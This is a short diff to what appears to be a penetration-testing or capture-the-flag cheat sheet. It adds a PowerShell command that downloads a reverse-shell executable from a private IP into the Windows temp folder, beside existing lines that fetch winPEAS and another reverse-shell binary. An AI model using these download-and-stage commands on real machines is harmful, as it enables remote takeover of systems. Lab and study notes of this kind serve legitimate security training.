@@ -332,6 +332,8 @@ on windows machine
 powershell -c wget "http://10.4.9.144:8080/winPEAS.exe" -outfile "winPEAS.exe"
 
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.4.9.144:8000/reverseShell.exe','reverseShell.exe')"
+
+powershell -c "Invoke-WebRequest -Uri 'http://10.4.9.144:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
 ```
 
 ## download files from box
